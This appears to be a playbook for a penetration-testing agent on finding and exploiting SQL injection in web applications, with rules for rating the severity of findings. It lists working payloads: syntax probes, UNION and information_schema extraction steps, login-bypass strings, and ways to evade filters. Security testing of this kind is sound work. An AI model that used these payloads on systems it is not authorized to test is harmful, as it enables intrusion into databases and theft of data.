# SQL injection

**When:** a request value reaches a database query. Signals: SQL error in a
response, login bypass shape, boolean or timing delta between matched
payloads, sort/filter params, report/search endpoints.

## Confirm the channel first

Baseline `1`, then `1'` (syntax probe), then a matched pair on the SAME input:
`' AND '1'='1` vs `' AND '1'='2`. Read the difference:

| Observation | Channel |
|---|---|
| DBMS error text appears | error-based |
| true/false responses differ in content | boolean-blind |
| only response time differs | time-blind |
| injected row/column reflected | UNION |

`probe_sqli` runs exactly this and reports the verdict + request_ids.
`probe_time` covers SLEEP/pg_sleep/WAITFOR plus shell separators.

## Extraction order (only after confirming)

1. Fingerprint DBMS once: MySQL `@@version`, Postgres `version()`, MSSQL
   `@@version`, Oracle `v$version`.
2. UNION: find column count with `ORDER BY N` (raise N until error), then
   `UNION SELECT NULL,...,marker` placing the marker in each position.
3. information_schema: `table_name` from `information_schema.tables`, then
   `column_name` from `information_schema.columns where table_name='x'`.
4. Blind: binary-search character codes (~7 requests/char), not linear scan.

## Auth bypass quick set (login forms only)

`' OR '1'='1'-- -` · `admin'-- -` · `admin'#` · `') OR ('1'='1` · `" OR "1"="1`

## Bypasses when filtered

- Comments: `-- -`, `#`, `/*...*/`; inline comment execution `/*!SELECT*/` (MySQL)
- Space filters: `/**/`, `+`, `%09`, parentheses
- Quote filters: hex `0x...`, `CHAR(0x..)`, numeric contexts need no quotes
- Keyword filters: `UnIoN SeLeCt`, `uNioN`, whitespace variants
- JSON body: keep syntax inside the JSON value string

## Falsifier

Matched true/false pair returns identical validated responses at an immediate
sink. For stored/second-order injection: the consuming page/job shows no
injected effect after it has run.

## Severity guide

- Auth bypass or data extraction shown: high/critical
- Blind confirmed with timing: high
- Error-based only, no extraction path demonstrated: medium-high
- sqlmap confirms but you could not reproduce manually: verify first, then rate
